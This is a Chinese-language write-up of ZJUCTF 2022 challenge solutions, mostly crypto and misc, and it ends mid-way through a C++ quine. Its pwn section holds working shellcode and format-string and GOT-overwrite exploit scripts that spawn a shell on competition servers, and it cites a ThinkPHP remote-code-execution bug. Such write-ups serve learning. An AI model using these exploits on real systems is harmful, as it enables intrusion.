# ZJUCTF 2022

Too hard for me，上一次做ctf是hackergame2021，这比hackergame2021难多了。

## Misc

### chisato?

注意到给你的两个数（标识符，选择）可以恢复出随机数来，624个随机数就可以恢复随机数的状态，参考[https://www.anquanke.com/post/id/205861#h3-9](https://www.anquanke.com/post/id/205861#h3-9)。有个库可以直接拿来用 [Python-random-module-cracker](https://github.com/tna0y/Python-random-module-cracker)。

代码如下

```python
from pwn import *
from randcrack import RandCrack

rc = RandCrack()

rm = 1
if rm == 1:
    sh = remote('10.214.160.76', 24562)
else:
    sh = process(['python', './main.py'])

sh.recv()
sh.sendline(b'0')
game_choice = ["石头", "剪刀", "布"]
cnt = 0

for i in range(512):
    recv = sh.recvline_contains(b'Round').decode('utf-8')
    id = re.match(r'Round \d+: #(.*)$', recv).group(1)
    id_num = int(id, 16)
    sh.sendline(game_choice[0].encode('utf-8'))
    recv = sh.recvline_contains('我出的是'.encode('utf-8')).decode('utf-8')
    random_choice = recv.split(' ')[-1]
    random_num = game_choice.index(random_choice)
    randombits = (id_num ^ random_num)*3+random_num
    rc.submit(randombits)
    cnt += 1

sh.sendline(b'0')

for i in range(512):
    recv = sh.recvline_contains(b'Round').decode('utf-8')
    id = re.match(r'Round \d+: #(.*)$', recv).group(1)
    id_num = int(id, 16)
    sh.sendline(game_choice[0].encode('utf-8'))
    recv = sh.recvline_contains('我出的是'.encode('utf-8')).decode('utf-8')
    random_choice = recv.split(' ')[-1]
    random_num = game_choice.index(random_choice)
    randombits = (id_num ^ random_num)*3+random_num
    if (cnt < 624):
        cnt += 1
        rc.submit(randombits)
    else:
        rc.predict_getrandbits(32)
sh.recv()
sh.sendline(b'1')
for i in range(512):
    random_choice = rc.predict_getrandbits(32) % 3
    # print(game_choice[(random_choice+2) % 3])
    sh.sendline(game_choice[(random_choice+2) % 3].encode('utf-8'))
    # print(sh.recv().decode('utf-8'))

sh.interactive()
```

### 2zsteg

stegsolve，发现3个通道的LSB有信息，拼起来，多试几次就能蒙对flag

### ZJU detective1

stegsolve 里可以在RGB的LSB发现黑客留下的信息，告诉你是6个digits的密码，然后爆破。

密码是414141，真是6个数字，我试了所有字符。

### ZJU detective3

extundelete跑一下，可以恢复一个vi的swap文件。`vi -r` 恢复flag。

### Gacha Game

看一下网页源代码，发现有一个有趣的函数，

```javascript
var flag='';for(var i=-0x1d09*-0x1+-0x4cf+0x1bb*-0xe;i<s['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68'];i++)flag+=String['\x66'+'\x72'+'\x6f'+'\x6d'+'\x43'+'\x68'+'\x61'+'\x72'+'\x43'+'\x6f'+'\x64'+'\x65'](s[i]^t[i]);alert(flag);
```

var flag后面的部分拉出来丢进console跑。

### polyglot

非常有意思的题目，第一反应是#在c里面可以define，但是在python里面是注释，于是基本框架就是：

1. 写一个合法的python
2. 用define转化成合法的c

python里面有一些预定义变量可以拿来当占位符，解决`int main(){`之类的问题

由于得跑system，得从os里面import，需要一个把`from os import system`翻译成c的办法

代码如下

```c
#define __name__ int main(){
#define print printf
#define from void*
#define import =(void*)&
#define __doc__ }
#include <stdio.h>
#include <stdlib.h>
from os import system;
__name__
system("cat /flag.txt");
__doc__
```

## Crypto

其实上次比赛我基本做的都是misc（挠头），这次读研了感觉得学一点密码学。

### babymath

这是我卡了最久的一个crypto。

把digitsSum展开，一个数模n-1恰好是n进制下的digitSum，得到298个同余方程，CRT解出flag

芝士代码

```python
from unicodedata import digit
from sympy.ntheory.modular import crt

hint = [195, 257, 298, 317, 381, 403, 460, 533, 517, 661, 686, 625, 674, 705, 796, 765, 716, 859, 881, 901, 901, 873, 1026, 925, 1151, 1103, 967, 1069, 1170, 1051, 1246, 1261, 1192, 1243, 1286, 1417, 1428, 1565, 1519, 1621, 1360, 1531, 1538, 1533, 1696, 1785, 1633, 1597, 1734, 1601, 1753, 1857, 1922, 1939, 2116, 1853, 1945, 2011, 1798, 1981, 1794, 2145, 2119, 2093, 1831, 2149, 2232, 2229, 2590, 1951, 1953, 2245, 2390, 2205, 2401, 2325, 2259, 2611, 2324, 2861, 2641, 2303, 2275, 2497, 2501, 2699, 2968, 2149, 2591, 3001, 2910, 2521, 3013, 2667, 2591, 2797, 3136, 2959, 2875, 3101, 3375, 3181, 2695, 3053, 3421, 2929, 3153, 3397, 3061, 2831, 3130, 2749, 3546, 3313, 3441, 3345, 3703, 3391, 3232, 4021, 3601, 3563, 4312, 3013, 3801, 3253, 3604, 4013, 3946, 3911, 3511, 3733, 3750, 3505, 3721, 4133, 4170, 3901, 3846, 3841, 4171, 3657, 4613, 4621, 3461, 3923, 3841, 4277, 3750, 4201,
        4274, 3693, 4099, 3645, 4811, 4405, 3816, 4615, 3724, 4781, 4499, 4423, 3924, 5009, 4096, 4101, 4545, 4429, 5133, 4201, 4567, 3817, 5045, 4447, 5101, 4877, 4453, 3659, 4669, 4621, 4823, 4275, 4417, 4821, 5646, 5245, 5493, 5017, 4639, 4111, 5199, 5293, 5352, 4979, 5146, 5409, 4426, 5449, 5195, 5501, 4912, 5395, 4940, 5425, 5091, 5167, 5764, 5341, 5460, 5731, 5528, 5473, 6355, 5293, 5451, 4909, 5493, 5241, 5383, 6241, 5068, 4573, 5799, 5997, 5476, 5693, 5391, 5821, 5636, 5281, 5878, 5781, 6793, 5341, 6756, 6341, 6274, 5731, 6711, 5821, 6103, 5295, 5395, 6613, 6291, 5173, 5289, 6237, 5512, 6051, 6398, 6025, 6109, 6525, 6751, 6189, 6907, 6397, 6053, 7421, 6187, 6917, 6484, 6637, 6586, 7075, 6151, 7257, 6875, 7501, 7225, 7261, 5731, 7047, 7176, 7213, 7511, 6765, 7105, 7061, 6890, 6145, 7543, 6497, 8386, 6329, 7551, 6925, 6428, 7811, 7792, 8157, 7084, 7369, 7521, 6645, 7528, 6581]

c = 9686947542769122742385039563327158123431227511088170483571069869406770155038962300628276828960581350945144539669031067015077778409924257809362426135034124301623137991648892961757946032383680333041237294991302716769007866376118346496853236187612499464285803029713488752865667029818019179032032159581237021392143059022826899355166780845768059817154715589909678547861965981244072377406981761297438703461471154097169017815255396976392380787779466817573840563690008940434912994188846442420314220868202242146845

n = 118856438380326127899537644079643439489125113184784323314309197034015564405923662951272514730655822382978312942464810911971337104001934431716139468408009762892641643085647198466166771064307020006322355719661734742788990996482723571923016124443418282417207900904781710204108941937423282296555092729414344186323

mr = (c-1)//n

num = [i+1 for i in range(298)]
mod = [hint[i] % (i+1) for i in range(298)]

r = crt(num, mod)[0]

m = mr//r

print(int.to_bytes(m,64,'big'))
```

### babyDLP

尝试后发现phi可以分解，但是还剩有一个巨大的因数。我当时对 Pohlig-Hellman 的印象停留在必须分解出所有的因数，所以就放弃了。

看到hint以后尝试着拿已有的因数跑了一下 Pohlig-Hellman，得到一些垃圾。然后试着枚举哪些因数是要用的，得到正确结果。

```python
from Crypto.Util.number import *
from sympy.ntheory.modular import crt
from math import ceil, sqrt

p = 22874236765582512818346580947708667745188778288884101219751361699392149989458510773797824610944321686257783426829474659298957510513578978620495392070614563  # prime
# p-1 = 2 · 17 · 2509983517<10> · 2544123481<10> · 2569813369<10> · 2894510363<10> · 2958235517<10> · 4159802197<10> · 4166439437<10> · 2762558262...19<87>

factors = [2, 17, 2509983517, 2544123481,
           2569813369, 2894510363, 2958235517, 4159802197, 4166439437]

# 3*19*83*2746346838107494410916004620610220405114947440834076125445650433925355607575816470554639183290804479291237493373398461949803256064268162370489441087787
g = 12992966891086556058043617860106952736598816342586014149483372202900857379441187722193997976148795991526844581149548123484519204440052676174785545786320297

# c = g^x%p

c = 4006948706881298103593084841644986324930377713436980291670378524564662999515313693489885343780490631115314181593435331209712709857825836348345723998675361
# 7*572421243840185443370440691663569474990053959062425755952911217794951857073616241927126477682927233016473454513347904458530387122546548049763674856953623


def bsgs(a, b, p, ub):
    '''
    Solve for x in a^x=b mod p given a prime p.
    If p is not prime, you shouldn't use BSGS anyway.
    '''
    N = ceil(sqrt(ub))  # phi(p) is p-1 if p is prime
    # Store hashmap of g^{1...m} (mod p). Baby step.
    tbl = {pow(a, i, p): i for i in range(N)}
    # Precompute via Fermat's Little Theorem
    c = pow(a, N * (p - 2), p)

    # Search for an equivalence in the table. Giant step.
    for j in range(N):
        y = (b * pow(c, j, p)) % p
        if y in tbl:
            return j * N + tbl[y]

    # Solution not found
    return None


def pohlighellman(a: int, b: int, p: int, known_factors: list[int]):
    m = known_factors
    v = []
    for f in known_factors:
        u = (p-1)//f
        # for i in range(f):
        #     if pow(a,i*u, p) == pow(b,u,p):
        #         v.append(i)
        #         break
        a0 = bsgs(pow(a, u, p), pow(b, u, p), p, f)
        if (a0 == None):
            print(pow(a, u, p), pow(b, u, p), p, f)
        v.append(a0)
    for i in range(2**9):
        new_m = []
        new_v = []
        for l in range(len(known_factors)):
            if ((i>>l)&(0b1)) == 1:
                new_m.append(m[l])
                new_v.append(v[l])
        print(int.to_bytes(crt(new_m, new_v)[0], 32, 'big'))
    return 
        
pohlighellman(g, c, p, factors)
# print(int.to_bytes(m, 32, 'big'))

```

### easyDLP

看到hint之前一点不会，看到hint之后谷歌三次，会了。

第一部分可以Smarts attack，从网上找了个题解[CRYPTOCTF 2021 - HARD](https://blog.cryptohack.org/cryptoctf2021-hard)

第二部分分析一下以后会发现，这其实是个展开了的椭圆曲线运算（为此去认真学习了加法怎么算），将图像整体平移之后会得到一个 Cusp Singular curves（delta=0，有三重根），这种曲线上的dlp映射到一个加法群。

第三部分注意到 `E.order() | (p^k-1)` 最小的 `k=2`，这是一个 SuperSingular curves，这种曲线上的dlp映射到一个乘法群。

这个是sage
```python
from Crypto.Util.number import *


def flag1():
    (p, A, B) = (1383333670554863678551666822362196239242273588051,
                 299446119796668317821474260946629183722027371877, 722591700505463573820128374277044703680164144116)
    E = EllipticCurve(GF(p), [A, B])
    assert E.order() == p
    P = E(221504092673696048756389221905190313468598958747,
          1294055609263533522129037670663961210779668618001)
    Q = (551904316353996448232767105468524655074816725512,
         328919104033453656310428760774262418742438103547)

    xP = 221504092673696048756389221905190313468598958747
    yP = 1294055609263533522129037670663961210779668618001
    xQ = 551904316353996448232767105468524655074816725512
    yQ = 328919104033453656310428760774262418742438103547

    Qp = Qp(p, 2)
    Ep = EllipticCurve(Qp, [A, B])

    yPp = sqrt(Qp(xP) ** 3 + Qp(A) * Qp(xP) + Qp(B))
    Pp = Ep(Qp(xP), (-yPp, yPp)[yPp[0] == yP])

    yQp = sqrt(Qp(xQ) ** 3 + Qp(A) * Qp(xQ) + Qp(B))
    Qp = Ep(Qp(xQ), (-yQp, yQp)[yQp[0] == yQ])

    print('Pp = {}'.format(Pp))
    print('Qp = {}'.format(Qp))
    print('-' * 40)

    lQ = Ep.formal_group().log()(- (p * Qp)[0] // (p * Qp)[1]) / p
    print('log(Q) = {}'.format(lQ))
    lP = Ep.formal_group().log()(- (p * Pp)[0] // (p * Pp)[1]) / p
    print('log(P) = {}'.format(lP))
    print('-' * 40)

    e = lQ / lP
    print('e = {}'.format(e))

    assert e[0] * E(xP, yP) == E(xQ, yQ)

    return int.to_bytes(int(e[0]), 16, 'big')


def add2(A, B, p):  # curve add on y^2 = (x+tmp)^3+b
    (u, v), (w, x) = A, B
    tmp = 3703296679
    assert u != w or v == x
    if u == w:  # A==B
        m = (3*u*w + 6*tmp*u + 3*(tmp**2)) * inverse(v+x, p) % p  # 3(u+tmp)^2
    else:
        m = (x-v) * inverse(w-u, p) % p
    y = m*m - u - w - 3*tmp
    z = m*(u-y) - v
    return y % p, z % p


def mul2(t, p, A, B):
    if t == 0:
        return B
    if t & 1 == 0:
        return mul2(t//2, p, add2(A, A, p), B)
    else:
        if B == 0:
            return mul2(t//2, p, add2(A, A, p), A)
        else:
            return mul2(t//2, p, add2(A, A, p), add2(B, A, p))


def flag2():
    tmp = 3703296679
    p = 1430713142868998353655213629157505619980590661013
    # E = EllipticCurve(GF(p), [0, 0])
    P = (1430713142868998353655213629157505619976887364338,
         1430713142868998353655213629157505619980590661005)
    P_shift = (1430713142868998353655213629157505619976887364338+tmp,
               1430713142868998353655213629157505619980590661005)
    Px = 1430713142868998353655213629157505619976887364338+tmp
    Py = 1430713142868998353655213629157505619980590661005
    Q = (1289003758451262829701971516408791055003461016142,
         612906784441363867129513135019819348442466025756)
    Qx = 1289003758451262829701971516408791055003461016142+tmp
    Qy = 612906784441363867129513135019819348442466025756
    Q_shift = (1289003758451262829701971516408791055003461016142+tmp,
               612906784441363867129513135019819348442466025756)

    b = Qx * inverse(Qy, p) % p
    a = Px * inverse(Py, p) % p

    flag = b*inverse(a, p) % p

    print(int.to_bytes(int(flag), 16, 'big'))
    # Q = mul2(bytes_to_long(flag2), p, P, 0)
    # print("Q =", Q)


def flag3():
    p = 77103137342944625087689813967
    E = EllipticCurve(GF(p), [1, 0])  # y^2=x^3+x
    k = 2  # min_k E.order() | (p^k-1)
    Fy = GF(p ^ k, 'y')
    Ee = EllipticCurve(Fy, [1, 0])
    Pt = (35918494029604741269165486995, 2587928336728112053842246345)
    Qt = (1766945551360556875611781114, 37984147318768365388049716288)
    P = E(Pt)
    Q = E(Qt)
    Pe = Ee(Pt)
    Qe = Ee(Qt)


    R = Ee.random_point()
    m = R.order()
    d = gcd(m, P.order())
    T = (m//d)*R

    assert P.order()/T.order() in ZZ
    assert P.order() == T.order()

    n = P.order()
    a = Pe.weil_pairing(T, n)
    b = Qe.weil_pairing(T, n)
    flag = b.log(a)
    print(flag)


f1 = b'ZJUCTF{Master_11'
f2 = b'4514_0f_E1lipt1c'
f3 = b'_Curve_1919}'
print(f1+f2+f3)

```

### signin_crypto1

在纸上推了一下，发现其实中间大部分步骤都不重要，只要知道最后lr两段和原先lr两段的关系就行。

从fake_flag可以推出黑盒最后和lr交互的两个参数，然后丢给真的密文恢复就行了。

```python
import os

real_flag = 'ZJUCTF{...}'
fake_flag = 'ZJUCTF{Fe15tel_c1pher_i5_e@sy_f0r_y0u_2}'


def xor(a, b):
    return ''.join(chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b))


def str_to_hex(s):
    return s.encode().hex()


def swap(a):
    return a[16:] + a[:16]


def single(m, k):
    assert len(m) == 32
    l = m[: 16]
    r = m[16:]
    nl, nr = r, xor(k, xor(l, r))
    return nl + nr


def encrypt(m, k):
    for i in k:
        m = single(m, i)
    return swap(m)


k = []
for i in range(0, 16):
    k.append(os.urandom(8).hex())

# print(str_to_hex(encrypt(fake_flag[7: -1], k)))
# print(str_to_hex(encrypt(real_flag[7: -1], k)))

enc_fake = bytes.fromhex(
    '3a6d603c3d656d61673e6c6e653934316d6a393b646d67613b36613165363d37').decode('utf-8')
enc_real = bytes.fromhex(
    '180f371830755d0f3078102b673b65396d54391a24210e3438715b7f61250163').decode('utf-8')

def get_k():
    em = swap(enc_fake)
    eml = em[: 16]
    emr = em[16: ]
    ml = fake_flag[7: -1][: 16]
    mr = fake_flag[7: -1][16: ]
    ka = xor(mr,eml)
    kb = xor(xor(ml, mr), emr)
    return [ka, kb]

def get_ans(ka, kb):
    em = swap(enc_real)
    eml = em[: 16]
    emr = em[16: ]
    mr = xor(eml, ka) 
    ml = xor(xor(emr, mr), kb)
    return ml + mr

ka, kb = get_k()
print(get_ans(ka, kb))

```

### SSC

直接quipquip

### HSC

这是个少了几个位置的 Hill cipher，如果把最后那个}换过来还少四个明文，穷举这几个明文，看看恢复出来的东西是不是printable。解出来的第一个答案不对，最后发现有多解。

这也是sage
```python
from socketserver import ThreadingUnixStreamServer
from pwn import *

# assert MT.is_invertible()
# flag = "AAA{?????????????????????????}"  # ? means unknown printable char
# FT = matrix(Zmod(256), 3, 10)
# for i in range(3):
#  for j in range(10):
#   FT[i, j] = ord(flag[i+j*3])
# RT = MT * FT
# result = b''
# for i in range(10):
#  for j in range(3):
#   result += bytes([RT[j, i]])

result = b"\xfc\xf2\x1dE\xf7\xd8\xf7\x1e\xed\xccQ\x8b9:z\xb5\xc7\xca\xea\xcd\xb4b\xdd\xcb\xf2\x939\x0b\xec\xf2"

# result = b'A\xc3A{\x9000\x90}?\xbd??\xbd??\xbd??\xbd??\xbd??\xbd??\xbd}'


RT = matrix(Zmod(256), 3, 10)
for i in range(10):
    for j in range(3):
        RT[j, i] = result[i*3+j]

ResultT = RT[:, :2].augment(RT[:, -1:])

# print(RT)
# print(ResultT.is_invertible())

alphabet = string.digits + string.ascii_letters + string.punctuation

def test(candidate: str):
    assert (len(candidate) == 4)
    if (candidate == 'Bl&4'): 
        return False;
    known = ("AAA{"+candidate+'}')
    NT = matrix(Zmod(256), 3, 3)
    for i in range(3):
        for j in range(3):
            NT[i, j] = ord(known[i+j*3])
    if (not NT.is_invertible()):
        # print('NT inrevetible')
        return False
    MT = ResultT * NT.inverse()
    assert (MT*NT == ResultT)
    if (not MT.is_invertible()):
        # print('MT inrevetible')
        return False
    OT = MT.inverse() * RT
    res = b''
    for i in range(10):
        for j in range(3):
            res += bytes([OT[j, i]])
            if (not chr(OT[j, i]) in alphabet):
                return False
    print(res)
    return True

# sl&1
pwnlib.util.iters.mbruteforce(test, alphabet, 4, 'fixed')

```

### MSC

MT19937 [https://www.anquanke.com/post/id/205861#h3-9](https://www.anquanke.com/post/id/205861#h3-9)。

通过尝试可以拿到89*24个8位信息，flag里的`AAA{`又给了32位，刚好凑够19968位。

参考 coin flip 的做法，构造一个19968*19968的矩阵，求解初始状态。你可能会构造出一个不满秩的矩阵，解出来多解，但运气好的话就能直接得到解（

代码基本是直接拿来用的
```python
from sage.all import *
from random import Random
from tqdm import tqdm
from Crypto.Util.strxor import strxor
# 根据文件中的信息，构造矩阵

length = 19968


def buildMatrix():
    length = 19968
    cnt = 0
    m = matrix(GF(2), length, length)
    file = open("Matrix", "r")
    for i in tqdm(range(length*length)):
        num = int(file.read(1))
        row = cnt // 19968
        col = cnt % 19968
        m[row, col] = num
        cnt += 1
    return m


m = buildMatrix()


def read_data():
    data = []
    file = open("data_extracted.bin", "rb")
    for i in range(length//8):
        x = file.read(1)
        data += [int(b) for b in bin(int.from_bytes(x,'little'))[2:].zfill(8)]
    return data

# X = Z*(T^-1)


def recoverState(leak):
    x = m.solve_left(leak)
    x = ''.join([str(i) for i in x])
    state = []
    for i in range(624):
        tmp = int(x[i * 32:(i + 1) * 32], 2)
        state.append(tmp)
    return (3, tuple(state+[0]), None)


def run():
    prng = Random()
    data = read_data()
    leak = vector(GF(2), data)
    # 恢复state
    state = recoverState(leak)
    prng.setstate(state)
    for i in range(28*89):
        prng.getrandbits(8)
    key = b''
    file = open("flag.bin", "rb")
    data = file.read(28)
    for i in range(28):
        key += bytes([prng.getrandbits(8)])
    print(strxor(key, data))


run()

```

构造矩阵的代码

```python
#! /bin/bash/env python3
from sage.all import *
from random import Random
from tqdm import tqdm
prng = Random()
length = 19968


def myState():
    state = [0]*624
    i = 0
    while i < length:
        ind = i//32
        expont = i % 32
        state[ind] = 1 << (31-expont)
        s = (3, tuple(state+[0]), None)
        yield s
        state[ind] = 0
        i += 1


def getRow():
    rng = Random()
    gs = myState()
    for i in range(length):
        s = next(gs)
        rng.setstate(s)
#         print(s[1][0])
        randoms = [rng.getrandbits(8) for i in range(length//8)]
        row_num = []
        for x in randoms:
            row_num += [int(b) for b in bin(x)[2:].zfill(8)]
        row = vector(GF(2), row_num)
        yield row


def buildBox():
    b = matrix(GF(2), length, length)
    rg = getRow()
    for i in tqdm(range(length)):
        b[i] = next(rg)
    return b


def test():
    prng = Random()
    originState = prng.getstate()
    randoms = [prng.getrandbits(8) for i in range(length//8)]
    row_num = []
    for x in randoms:
        row_num += [int(b) for b in bin(x)[2:].zfill(8)]
    leak = vector(GF(2), row_num)
    b = buildBox()
    f = open("Matrix", "w")
    for i in range(b.nrows()):
        for j in range(b.ncols()):
            f.write(str(b[i, j]))
    f.close()
    x = b.solve_left(leak)
    x = ''.join([str(i) for i in x])
    state = []
    for i in range(624):
        tmp = int(x[i*32:(i+1)*32], 2)
        state.append(tmp)
    prng.setstate(originState)
    prng.getrandbits(1)
    originState = [x for x in prng.getstate()[1][:-1]]
    print(originState[1:] == state[1:])
#     print(state)
    return state, b


test()

```

### CPKv1

完全没懂CPK怎么工作。根据程序的debug输出，尝试了next接口，发现返回值总是同一个。debug发现它需要一个username的query。传入username=admin进去，给出了一个错误返回以及一对密钥。

在flag接口上debug发现需要一个key query，把admin的private key传进去，直接得到了flag。

### pretend to be rich

论文题，文章才4页，真的攻击部分就一小段。实现都给你了，花20分钟看完论文你就能白得400分。

由于验证的r2和D2我们都可以控制，给r2和D2各乘一个编号就行。

```python
from ecdaa import *
from pwn import *

# rr = process(['python3', 'ecdaa.py'], stderr=2)
rr = remote('10.214.160.76',22555)
X, Y = deserialize4json(E, rr.recvline().strip().decode())
A, B, C, Ev = deserialize4json(E, rr.recvline().strip().decode())
pa = e(A, X)
pb = e(B, X)
pc = e(C, H)
bsn = b'ZJU_AAA'
for no in range(1, 11):
    r2, = deserialize4json(E, rr.recvline().strip().decode())
    r2 = r2 * no
    A2 = r2 * A
    B2 = r2 * B
    C2 = r2 * C
    E2 = r2 * Ev
    print('send ABCE')
    rr.sendline(serialize2json(A2, B2, C2, E2).encode())
    D2, = deserialize4json(E, rr.recvline().strip().decode())
    D2 = no * D2
    pa2 = pa ** r2
    pb2 = pb ** r2
    pc2 = pc ** r2
    t = e(D2, X)
    c2 = Hn(q, 3, bsn, X, Y, A2, B2, C2, D2, E2, pa2, pb2, pc2, t)
    print('send c2')
    rr.sendline(serialize2json(c2).encode())
    print(rr.recvline().strip().decode())

print(rr.recvline().strip().decode())

```

## Pwm

### shellcode_master1&2

我上网毛了个22字节的shellcode

[even-shorter-shellcode](https://systemoverlord.com/2016/04/27/even-shorter-shellcode.html)

```python
from pwn import *

shellcode = b'\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05'

shellcode2 = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

shellcode3 = b'\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05'

r = remote('10.214.160.76', 48871)
r.send(shellcode3)
r.send(b'ls')
r.interactive()

```

### signin_pwn1

从got把printf的地址拿出来，找到system对应的地址，把system写进free got

```python
from pwn import *
import re
# from LibcSearcher import LibcSearcher
##context.log_level = 'debug'
pwn3 = ELF('./signin_pwn1')
libc = ELF('./libc.so.6')
rm=1
if rm==1:
    sh = remote('10.214.160.76', 44155)
else:
    sh = process('./signin_pwn1')

# gdb.attach(sh)
shell = '/bin/sh'
sh.sendline(shell)
printf_got = pwn3.got['printf']
print('printf got', (printf_got))
sh.recvline()
sh.recv()
sh.sendline(str(printf_got).encode('utf-8'))
printf_addr_bytes = sh.recvline()[21:-1]
printf_addr = int.from_bytes(printf_addr_bytes,'little')

## get addr of system
system_offset = libc.symbols['system']
# print(system_offset)
printf_offset = libc.symbols['printf']
# print(free_offset)
system_addr = printf_addr - printf_offset + system_offset
print('system addr', (system_addr))

sh.sendline(str(pwn3.got['free']).encode('utf-8'))
sh.sendline(str(system_addr).encode('utf-8'))

sh.interactive()

```

### signin_pwn2

每一次只能写一次，没有泄露的地址只写一次是不可能搞定的，只能想办法多跑几次

最后有一个exit，把这个exit的got改成main，然后再调用一次main，就可以再运行无数次了

注意到system调一个不存在的东西只报错不崩溃，所以可以把printf改成system

第二次泄露出地址，第三次把printf的got改成system，第四次输入/bin/sh

```python
from pwn import *
from pwnlib import fmtstr
rm = 1
proc = ELF('./signin_pwn2')
if rm == 0:
    r = process('./signin_pwn2')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    r = remote('10.214.160.76', 40218)
    libc = ELF('./libc.so.6')
main = 0x4012cb
# gdb.attach(r)
'''
cb 203

d0 208
12 18
40 64
00
00000000
'''


exit_got = proc.got['exit']
puts_got = proc.got['puts']
printf_got = proc.got['printf']
print(hex(printf_got))

# payload = b"%208c%12$hhn%66c%13$hhn%46c%14$hhn%192c%15$hhn%16$nGGGGG" + p64(exit_got) + p64(exit_got + 2) + \
#     p64(exit_got + 4) + p64(exit_got + 6) + p64(exit_got + 8)
payload = b"%203c%12$hhn%71c%13$hhn%46c%14$hhn%192c%15$hhnG\x00" + p64(exit_got) + p64(exit_got + 1) + \
    p64(exit_got + 2) + p64(exit_got + 3)

r.recv()
r.send(payload)
# print(1, r.recv())

payload = b"%7$sGGGG" + p64(printf_got)
sleep(1)
r.recv()
r.send(payload)
sleep(1)
data = r.recv()
print(data)
index = data.find(b'you, ')
content = data[index+5:index+11]
print(content)
context(arch='amd64', os='linux')
printf_addr = int.from_bytes(content,'little')
system_addr = printf_addr - libc.symbols['printf'] + libc.symbols['system']
print(hex(system_addr))
payload = fmtstr.fmtstr_payload(6, {printf_got: system_addr},
                      numbwritten=0, write_size='short')
print(payload)
r.send(payload)
r.send(b'/bin/sh\x00')
r.interactive()

```

### UOJ Hacks 1

公告里真的有题解，抄过来直接用了。

[https://uoj.ac/submission/277631](https://uoj.ac/submission/277631)

把stdout buffer然后atexit输出

代码压根没存

## Web

### pentest1

[ThinkPHP 5.x 远程命令执行漏洞分析与复现](https://learnku.com/articles/21227   )

根据提示 `find / -name "*.sh"`文件会找到一个bak.sh，把里面的Token:user改成Token:admin即可

谁想的Token后面跟名字？？？？

### warmup

改一下 UA 和 X-Forwarded-By

### Re0

[preg_match绕过总结](https://www.cnblogs.com/20175211lyz/p/12198258.html)

php的pregmatch有上限，默认超过1000000的字符串直接返回false，所以把post的code长度超过1000000就行了。

## Reverse
### babyre

符号还在，读一下发现是个SM4

把参数拿出来单独跑一个SM4的解密即可。

```c

#include <stdio.h>
#include "sm4.h"
char *key = "xpLBYaJVKyjX^cwd";
char cmp[16] = {0x36, 0x6D, 0xED, 0x6B, 0xFE, 0x88, 0x3B, 0xC9, 0x01, 0xA5, 0x37, 0xA5, 0x03, 0xC2, 0x3C, 0x02};
char 
int main()
{
    char output[16];
    sm4_context ctx;
    sm4_setkey_enc(&ctx, key);
    sm4_crypt_ecb(&ctx, SM4_ENCRYPT, 16, key, output);
    for(int i=0;i<16;i++){
        output[i]^=cmp[i];
    }
    printf("%s", output);
}
```

### apk1
根据题面描述，丢进模拟器把定位调到昆仑站即可

### apk1.33
apktools+dex2jar反汇编出来代码，把逻辑反向实现一遍即可

```python
from base64 import b64decode
from pwn import *
from pwnlib import util
from Crypto.Cipher import AES

zjuctf = b'zjuctf'

encoded_data_return = 'ubr6_0I7n8t1e9n1te?2!4}5'

str = util.hashes.md5sumhex(zjuctf)

def get_data_return():
    res = ''
    for i in range(len(encoded_data_return)):
        if i % 2 == 0:
            res += encoded_data_return[i]
    return res


aes_cipher = b64decode('cDgmIZ5xitoh6IhNALRTsH8iMqRfg3oEvX1N5YuniPY=')
aes_key = b'\x2F\x25\x35\x3B\x30\xD5\xC9\xD2\x59\xF9\xB1\xE4\x4B\x5C\xA0\x01\x12\xB3\xC8\x4A\xC6\x7C\x8A\xA3\xE3\x78\x34\x02\xCA\x6B\x17\xB0'
cipher = AES.new(aes_key, AES.MODE_ECB)
plain = cipher.decrypt(aes_cipher).decode('utf-8')
data_return = get_data_return()
print(plain+data_return)
```

### re signin
快乐的读高级语言时间

## Blockchain
### eth secret

[layout_in_storage](https://docs.soliditylang.org/en/v0.8.17/internals/layout_in_storage.html)

根据以太坊的存储方式，算出keccak256(0)，然后getStorageAt即可。

## Forensics
我只做了签到和签退qwq

## Hardware
### HarmonyOS1
根据文档用qemu运行起来，跑起来试着运行一下所有可用的命令，不知道为什么出来一个flag.js，用jerry跑一下即可。

这玩意不支持相对路径。传参的时候得用 /ramfs/flag.js

### HarmonyOS2
date里面有额外的信息，`watch -n 1 date`

理论上可以tee到文件里，我当时没想到，直接拿手机拍屏幕了。

## PPC
### Self SHA
虽然提示说是 Hash length extension attack，但我只做了quine

如果当quine做的话那就是裸quine，就是长了点。我好像是所有通过的选手里代码最长的，足足10k

```cpp
#include <stddef.h>
#include <cstring>
#include <cstdio>
#define SHA256_BLOCK_SIZE 32
typedef unsigned char BYTE;
typedef unsigned int WORD;
typedef struct{
BYTE data[64];
WORD datalen;
unsigned long long bitlen;
WORD state[8];
} SHA256_CTX;
#define ROTLEFT(a, b) (((a) << (b)) | ((a) >> (32 - (b))))
#define ROTRIGHT(a, b) (((a) >> (b)) | ((a) << (32 - (b))))
#define CH(x, y, z) (((x) & (y)) ^ (~(x) & (z)))
#define MAJ(x, y, z) (((x) & (y)) ^ ((x) & (z)) ^ ((y) & (z)))
#define EP0(x) (ROTRIGHT(x, 2) ^ ROTRIGHT(x, 13) ^ ROTRIGHT(x, 22))
#define EP1(x) (ROTRIGHT(x, 6) ^ ROTRIGHT(x, 11) ^ ROTRIGHT(x, 25))
#define SIG0(x) (ROTRIGHT(x, 7) ^ ROTRIGHT(x, 18) ^ ((x) >> 3))
#define SIG1(x) (ROTRIGHT(x, 17) ^ ROTRIGHT(x, 19) ^ ((x) >> 10))
static const WORD k[64] = {
0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
